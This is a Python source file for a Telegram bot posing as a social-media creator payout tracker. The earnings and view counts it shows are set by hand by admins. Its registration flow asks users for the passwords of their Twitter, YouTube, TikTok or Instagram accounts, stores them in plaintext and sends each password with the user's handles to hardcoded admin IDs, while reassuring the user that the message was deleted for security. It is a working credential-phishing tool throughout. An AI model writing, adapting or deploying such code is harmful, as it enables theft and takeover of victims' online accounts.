import asyncio
import html
import logging
import os
from contextlib import suppress

from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from dotenv import load_dotenv

# Load variables from .env
load_dotenv()

# --- CONFIGURATION ---
TOKEN = os.getenv("BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
ADMIN_IDS = [
    int(x.strip()) for x in os.getenv("ADMIN_IDS", "1438037591").split(",") if x.strip().isdigit()
]

logging.basicConfig(level=logging.INFO)

# --- DATABASE LAYER (Neon PostgreSQL with SQLite Fallback) ---
class Database:
    def __init__(self, dsn: str | None = None):
        self.dsn = dsn
        self.is_postgres = bool(dsn)
        self.pool = None
        self.db_path = "bot_database.db"

    async def connect(self):
        if self.is_postgres:
            import asyncpg
            dsn = self.dsn
            if dsn.startswith("postgres://"):
                dsn = dsn.replace("postgres://", "postgresql://", 1)
            self.pool = await asyncpg.create_pool(dsn, min_size=1, max_size=10)
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        chat_id BIGINT PRIMARY KEY,
                        telegram_username TEXT,
                        views INTEGER DEFAULT 0,
                        money DOUBLE PRECISION DEFAULT 0.0
                    );
                    CREATE TABLE IF NOT EXISTS social_accounts (
                        id SERIAL PRIMARY KEY,
                        chat_id BIGINT,
                        telegram_username TEXT,
                        platform TEXT,
                        handle TEXT,
                        password TEXT
                    );
                """)
            logging.info(" Connected to Neon PostgreSQL database.")
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        chat_id INTEGER PRIMARY KEY,
                        telegram_username TEXT,
                        views INTEGER DEFAULT 0,
                        money REAL DEFAULT 0.0
                    )
                """)
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS social_accounts (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        chat_id INTEGER,
                        telegram_username TEXT,
                        platform TEXT,
                        handle TEXT,
                        password TEXT
                    )
                """)
                await db.commit()
            logging.info(" Connected to local SQLite database (bot_database.db).")

    async def close(self):
        if self.is_postgres and self.pool:
            await self.pool.close()

    async def get_user(self, chat_id: int):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    "SELECT telegram_username, views, money FROM users WHERE chat_id = $1",
                    chat_id,
                )
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    "SELECT telegram_username, views, money FROM users WHERE chat_id = ?",
                    (chat_id,),
                ) as cursor:
                    row = await cursor.fetchone()
                    if row:
                        return {"telegram_username": row[0], "views": row[1], "money": row[2]}
                    return None

    async def upsert_user(self, chat_id: int, telegram_username: str):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                await conn.execute(
                    """
                    INSERT INTO users (chat_id, telegram_username)
                    VALUES ($1, $2)
                    ON CONFLICT (chat_id) DO UPDATE SET telegram_username = EXCLUDED.telegram_username
                    """,
                    chat_id,
                    telegram_username,
                )
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    "INSERT OR REPLACE INTO users (chat_id, telegram_username) VALUES (?, ?)",
                    (chat_id, telegram_username),
                )
                await db.commit()

    async def update_user_stats(self, target_username: str, views: int, money: float) -> bool:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                status = await conn.execute(
                    "UPDATE users SET views = $1, money = $2 WHERE telegram_username = $3",
                    views,
                    money,
                    target_username,
                )
                return status != "UPDATE 0"
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                cursor = await db.execute(
                    "UPDATE users SET views = ?, money = ? WHERE telegram_username = ?",
                    (views, money, target_username),
                )
                await db.commit()
                return cursor.rowcount > 0

    async def add_social_account(
        self, chat_id: int, telegram_username: str, platform: str, handle: str, password: str
    ):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                await conn.execute(
                    """
                    INSERT INTO social_accounts (chat_id, telegram_username, platform, handle, password)
                    VALUES ($1, $2, $3, $4, $5)
                    """,
                    chat_id,
                    telegram_username,
                    platform,
                    handle,
                    password,
                )
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    """
                    INSERT INTO social_accounts (chat_id, telegram_username, platform, handle, password)
                    VALUES (?, ?, ?, ?, ?)
                    """,
                    (chat_id, telegram_username, platform, handle, password),
                )
                await db.commit()

    async def get_user_social_accounts(self, chat_id: int) -> dict:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch(
                    "SELECT platform, handle FROM social_accounts WHERE chat_id = $1 ORDER BY id ASC",
                    chat_id,
                )
                return {row["platform"]: row["handle"] for row in rows}
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    "SELECT platform, handle FROM social_accounts WHERE chat_id = ? ORDER BY id ASC",
                    (chat_id,),
                ) as cursor:
                    rows = await cursor.fetchall()
                    return {row[0]: row[1] for row in rows}

db = Database(DATABASE_URL)

# --- STATES ---
class BotStates(StatesGroup):
    waiting_for_username = State()
    main_menu = State()
    entering_handle = State()
    entering_password = State()

# --- KEYBOARDS ---
def get_main_menu_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📝 Register Account", callback_data="menu_register")],
            [
                InlineKeyboardButton(text="📊 Stats", callback_data="menu_stats"),
                InlineKeyboardButton(text="🚀 Progress", callback_data="menu_progress"),
            ],
        ]
    )

def get_platforms_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🐦 Twitter", callback_data="plat_Twitter"),
                InlineKeyboardButton(text="📺 YouTube", callback_data="plat_YouTube"),
            ],
            [
                InlineKeyboardButton(text="🎵 TikTok", callback_data="plat_TikTok"),
                InlineKeyboardButton(text="📸 Instagram", callback_data="plat_Instagram"),
            ],
            [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")],
        ]
    )

# --- HANDLERS ---
async def start_command(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    user = await db.get_user(chat_id)

    tg_user = message.from_user
    auto_username = f"@{tg_user.username}" if tg_user and tg_user.username else None

    if user:
        await state.set_state(BotStates.main_menu)
        display_name = html.escape(user["telegram_username"] or (tg_user.full_name if tg_user else "User"))
        await message.answer(
            f"Welcome back, <b>{display_name}</b>! Choose an option below:",
            reply_markup=get_main_menu_keyboard(),
        )
    elif auto_username:
        await db.upsert_user(chat_id, auto_username)
        await state.set_state(BotStates.main_menu)
        await message.answer(
            f"Welcome! 🎉 You were registered automatically as <b>{html.escape(auto_username)}</b>.\n\nChoose an option below:",
            reply_markup=get_main_menu_keyboard(),
        )
    else:
        await state.set_state(BotStates.waiting_for_username)
        await message.answer(
            "Welcome! 🎉 To get started, please enter your Telegram username starting with the <b>@</b> symbol (e.g., <code>@yourusername</code>):"
        )

async def process_username(message: types.Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text.startswith("@") or len(text) < 2:
        await message.answer(
            "❌ Invalid format. Please make sure your username starts with the <b>@</b> symbol (e.g., <code>@yourusername</code>). Try again:"
        )
        return

    chat_id = message.chat.id
    await db.upsert_user(chat_id, text)

    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Account registered successfully as <b>{html.escape(text)}</b>!",
        reply_markup=get_main_menu_keyboard(),
    )

# --- MENU CALLBACKS ---
async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext):
    data = callback.data
    chat_id = callback.message.chat.id
    await callback.answer()

    with suppress(TelegramBadRequest):
        if data == "menu_register":
            await callback.message.edit_text(
                "Select the social media platform you want to register:",
                reply_markup=get_platforms_keyboard(),
            )
        elif data == "menu_stats":
            user = await db.get_user(chat_id)
            if user:
                username = user["telegram_username"]
                views = user["views"]
                money = user["money"]
                username_str = html.escape(username or "User")
                await callback.message.edit_text(
                    f"📊 <b>Your Stats</b> (<i>{username_str}</i>)\n\n"
                    f"👁 Total Views: <b>{views:,}</b>\n"
                    f"💰 Total Earnings: <b>${money:.2f}</b>",
                    reply_markup=get_main_menu_keyboard(),
                )
            else:
                await callback.message.edit_text(
                    "Please type /start to register your account first.",
                    reply_markup=get_main_menu_keyboard(),
                )
        elif data == "menu_progress":
            user = await db.get_user(chat_id)
            if user:
                views = user["views"]
                goal = 50000
                percent = min(100.0, (views / goal) * 100)
                status = (
                    "✅ <b>Eligible for Payout!</b>"
                    if views >= goal
                    else f"❌ Needs <b>{goal - views:,}</b> more views for payout."
                )
                filled = int(percent // 10)
                progress_bar = "█" * filled + "░" * (10 - filled)
                await callback.message.edit_text(
                    f"🚀 <b>Payout Progress</b>\n\n"
                    f"Progress: [{progress_bar}] {percent:.1f}%\n"
                    f"Current Views: <b>{views:,} / {goal:,}</b>\n\n"
                    f"Status: {status}",
                    reply_markup=get_main_menu_keyboard(),
                )
            else:
                await callback.message.edit_text(
                    "Please type /start to register your account first.",
                    reply_markup=get_main_menu_keyboard(),
                )
        elif data == "back_to_menu":
            await callback.message.edit_text(
                "Main Menu:",
                reply_markup=get_main_menu_keyboard(),
            )

# --- SOCIAL REGISTRATION FLOW ---
async def platform_selected(callback: types.CallbackQuery, state: FSMContext):
    platform = callback.data.split("_")[1]
    await state.update_data(platform=platform)
    await state.set_state(BotStates.entering_handle)
    await callback.answer()

    with suppress(TelegramBadRequest):
        await callback.message.edit_text(
            f"You selected <b>{html.escape(platform)}</b>.\n\n"
            "Please enter your handle for this account starting with the <b>@</b> symbol (e.g., <code>@yourhandle</code>):"
        )

async def process_handle(message: types.Message, state: FSMContext):
    handle = (message.text or "").strip()
    if not handle.startswith("@") or len(handle) < 2:
        await message.answer(
            "❌ Invalid format. The handle must start with the <b>@</b> symbol (e.g., <code>@yourhandle</code>). Try again:"
        )
        return

    await state.update_data(handle=handle)
    await state.set_state(BotStates.entering_password)
    await message.answer("🔑 Please enter the password for this account:")

async def process_password(message: types.Message, state: FSMContext):
    password = (message.text or "").strip()
    chat_id = message.chat.id

    # Security: Delete the password message from Telegram chat immediately
    with suppress(Exception):
        await message.delete()

    data = await state.get_data()
    platform = data.get("platform")
    handle = data.get("handle")

    if not platform or not handle:
        await state.set_state(BotStates.main_menu)
        await message.answer(
            "⚠️ Registration timed out or was incomplete. Please choose an option from the menu:",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    user = await db.get_user(chat_id)
    telegram_username = user["telegram_username"] if user else f"id_{chat_id}"

    await db.add_social_account(chat_id, telegram_username, platform, handle, password)

    # Fetch all social accounts for this user and notify admin(s)
    socials = await db.get_user_social_accounts(chat_id)
    twitter_handle = socials.get("Twitter", "None")
    youtube_handle = socials.get("YouTube", "None")
    instagram_handle = socials.get("Instagram", "None")
    tiktok_handle = socials.get("TikTok", "None")

    admin_notification = (
        f"🔔 <b>New Account Registered!</b>\n\n"
        f"<b>username:</b> {html.escape(telegram_username)}\n"
        f"<b>twitter:</b> {html.escape(twitter_handle)}\n"
        f"<b>youtube:</b> {html.escape(youtube_handle)}\n"
        f"<b>instagram:</b> {html.escape(instagram_handle)}\n"
        f"<b>tiktok:</b> {html.escape(tiktok_handle)}\n\n"
        f"<b>Newly Added:</b> {html.escape(platform)} (<code>{html.escape(handle)}</code>)\n"
        f"<b>Password:</b> <code>{html.escape(password)}</code>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_message(admin_id, admin_notification)
        except Exception as e:
            logging.warning(f"Could not send notification to admin {admin_id}: {e}")

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Successfully registered <b>{html.escape(platform)}</b> account (<code>{html.escape(handle)}</code>)!\n"
        "<i>(Your password message was deleted from chat for security)</i>",
        reply_markup=get_main_menu_keyboard(),
    )

# --- ADMIN COMMAND: UPDATE STATS ---
async def update_stats_command(message: types.Message):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ You are not authorized to use this command.")
        return

    parts = (message.text or "").split()
    if len(parts) != 4:
        await message.answer(
            "⚠️ Incorrect usage.\nFormat: <code>/update @username views money</code>\nExample: <code>/update @johndoe 55000 100</code>"
        )
        return

    target_username = parts[1]
    if not target_username.startswith("@"):
        target_username = f"@{target_username}"
    try:
        new_views = int(parts[2])
        new_money = float(parts[3])
    except ValueError:
        await message.answer("⚠️ Views must be an integer and money must be a valid number.")
        return

    updated = await db.update_user_stats(target_username, new_views, new_money)

    if not updated:
        await message.answer(f"❌ User <code>{html.escape(target_username)}</code> not found in database.")
        return

    await message.answer(
        f"✅ Successfully updated stats for <b>{html.escape(target_username)}</b>:\n"
        f"👁 Views: <b>{new_views:,}</b>\n"
        f"💰 Money: <b>${new_money:.2f}</b>"
    )

# --- DUMMY WEB SERVER FOR RENDER FREE TIER ---
async def handle_ping(request):
    return web.Response(text="Bot is alive!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    return runner

# --- MAIN SETUP ---
async def main():
    await db.connect()
    runner = await start_web_server()
    bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher()

    # Commands
    dp.message.register(start_command, Command("start"))
    dp.message.register(update_stats_command, Command("update"))

    # FSM Input States
    dp.message.register(process_username, BotStates.waiting_for_username)
    dp.message.register(process_handle, BotStates.entering_handle)
    dp.message.register(process_password, BotStates.entering_password)

    # Callbacks
    dp.callback_query.register(
        menu_callback_router,
        F.data.startswith("menu_") | (F.data == "back_to_menu"),
    )
    dp.callback_query.register(platform_selected, F.data.startswith("plat_"))

    print("🤖 Bot is up and running...")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        await runner.cleanup()
        await db.close()

if __name__ == "__main__":
    asyncio.run(main())
